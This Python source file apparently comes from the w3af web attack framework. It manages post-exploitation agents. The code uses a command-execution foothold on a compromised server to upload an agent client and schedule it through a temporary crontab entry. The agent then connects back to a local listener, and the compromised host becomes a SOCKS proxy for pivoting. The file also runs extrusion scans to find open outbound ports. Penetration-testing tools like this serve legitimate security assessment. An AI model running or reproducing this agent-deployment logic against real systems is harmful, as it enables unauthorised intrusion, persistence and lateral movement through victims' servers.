"""
w3afAgentManager.py

Copyright 2006 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import os
import time
import socket

from multiprocessing.dummy import Process

import w3af.core.controllers.output_manager as om

from w3af import ROOT_PATH
from w3af.core.controllers.exceptions import BaseFrameworkException
from w3af.core.controllers.w3afAgent.server.w3afAgentServer import w3afAgentServer
from w3af.core.controllers.payload_transfer.payload_transfer_factory import payload_transfer_factory
from w3af.core.controllers.extrusion_scanning.extrusionScanner import extrusionScanner
from w3af.core.controllers.intrusion_tools.delayedExecutionFactory import delayedExecutionFactory
from w3af.core.controllers.intrusion_tools.execMethodHelpers import get_remote_temp_file


class w3afAgentManager(Process):
    """
    Start a w3afAgent, to do this, I must transfer the agent client to the
    remote end and start the w3afServer in this local machine.

    This is a Process, so the entry point is start() , which will
    internally call the run() method.
    """
    def __init__(self, exec_method, ip_address, socks_port=1080):
        Process.__init__(self)
        self.daemon = True

        #    Configuration
        self._exec_method = exec_method
        self._ip_address = ip_address
        self._socks_port = socks_port

        #    Internal
        self._agent_server = None

    def _exec(self, command):
        """
        A wrapper for executing commands
        """
        om.out.debug('Executing: ' + command)
        response = apply(self._exec_method, (command,))
        om.out.debug('"' + command + '" returned: ' + response)
        return response

    def run(self):
        """
        Entry point for the whole process.
        """

        # First, I have to check if I have a good w3afAgentClient to send to the
        # other end...
        try:
            interpreter, client_code, extension = self._select_client()
        except BaseFrameworkException:
            om.out.error('Failed to find a suitable w3afAgentClient for the remote server.')
        else:

            #
            #    Get a port to use. Extrusion scan or any other method is applied here.
            #
            inbound_port = self._get_inbound_port()

            #
            #    Start the w3afAgentServer on this machine
            #
            agent_server = w3afAgentServer(self._ip_address,
                                           socks_port=self._socks_port,
                                           listen_port=inbound_port)
            self._agent_server = agent_server
            agent_server.start()
            # Wait for it to start.
            time.sleep(0.5)

            if not agent_server.is_running():
                om.out.error(agent_server.get_error())
            else:

                #
                #    Now that everything is setup here, transfer the client
                #    to the remote end and run it.
                #
                ptf = payload_transfer_factory(self._exec_method)
                transferHandler = ptf.get_transfer_handler(inbound_port)

                if not transferHandler.can_transfer():
                    raise BaseFrameworkException('Can\'t transfer w3afAgent client to remote host, can_transfer() returned False.')
                else:
                    #    Let the user know how much time it will take to transfer the file
                    estimatedTime = transferHandler.estimate_transfer_time(
                        len(client_code))
                    om.out.debug('The w3afAgent client transfer will take "' +
                                 str(estimatedTime) + '" seconds.')

                    filename = get_remote_temp_file(self._exec_method)
                    filename += '.' + extension

                    #    Upload the file and check integrity
                    om.out.console('Starting w3afAgent client upload, remote filename is: "%s" ...' % filename)

                    upload_success = transferHandler.transfer(
                        client_code, filename)
                    if not upload_success:
                        raise BaseFrameworkException('The w3afAgent client failed to upload. Remote file hash does NOT match.')

                    om.out.console('Finished w3afAgent client upload!')

                    #    And now start the w3afAgentClient on the remote server using cron / at
                    self._delayedExecution(interpreter + ' ' + filename + ' ' + self._ip_address + ' ' + str(inbound_port))

                    #
                    #    This checks if the remote server connected back to the agent_server
                    #
                    if not agent_server.is_working():
                        om.out.console('Something went wrong, the w3afAgent client failed to connect back.')
                    else:
                        msg = 'A SOCKS proxy is listening on %s:%s' % (
                            self._ip_address, self._socks_port)
                        msg += ' , all connections made through this daemon will be routed '
                        msg += ' through the compromised server. We recommend using the proxychains tool '
                        msg += ' ("apt-get install proxychains") to route connections through the proxy, the '
                        msg += ' proxy configuration should look like "socks4    %s     %s"' % (self._ip_address, self._socks_port)
                        om.out.console(msg)

    def is_working(self):
        if self._agent_server is None:
            return False
        else:
            return self._agent_server.is_working()

    def _delayedExecution(self, command):
        dexecf = delayedExecutionFactory(self._exec_method)
        dH = dexecf.get_delayed_execution_handler()

        if not dH.can_delay():
            msg = '[w3afAgentManager] Failed to create cron entry.'
            om.out.debug(msg)
            raise BaseFrameworkException(msg)
        else:
            wait_time = dH.add_to_schedule(command)

            om.out.debug(
                '[w3afAgentManager] Crontab entry successfully added.')
            wait_time += 2
            om.out.information('Please wait ' + str(
                wait_time) + ' seconds for w3afAgentClient execution.')
            time.sleep(wait_time)

            om.out.debug('[w3afAgentManager] Restoring old crontab.')
            dH.restore_old_schedule()

    def _select_client(self):
        """
        This method selects the w3afAgent client to use based on the remote OS and some other factors
        like having a working python installation.
        """
        python = self._exec('which python')
        python = python.strip()

        if python.startswith('/'):
            client = os.path.join(ROOT_PATH, 'core', 'controllers', 'w3afAgent',
                                  'client', 'w3afAgentClient.py')
            file_content = file(client).read()
            extension = 'py'
            interpreter = python
        else:
            # TODO: Implement this!
            file_content = ''
            extension = 'py'
            interpreter = '/usr/bin/python'

        return interpreter, file_content, extension

    def _is_locally_available(self, port):
        """
        :return: True if the current user can bind to the specified port.
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            s.bind(('0.0.0.0', port))
        except:
            #    socket.error: [Errno 13] Permission denied
            #    Or some similar error
            return False

        return True

    def _get_inbound_port(self):
        # Do an extrusion scan and return the inbound open ports
        es = extrusionScanner(self._exec_method)
        try:
            inbound_port = es.get_inbound_port()
        except Exception, e:

            om.out.error('The extrusion scan failed.')
            om.out.error('Error: ' + str(e))

            for p in [8080, 5060, 3306, 1434, 1433, 443, 80, 25, 22]:
                if self._is_locally_available(p) and es.is_available(p, 'TCP'):
                    msg = 'Using inbound port "%s" without knowing if the remote'
                    msg += ' host will be able to connect back.'
                    om.out.console(msg % p)
                    return p

            raise e
        else:
            return inbound_port
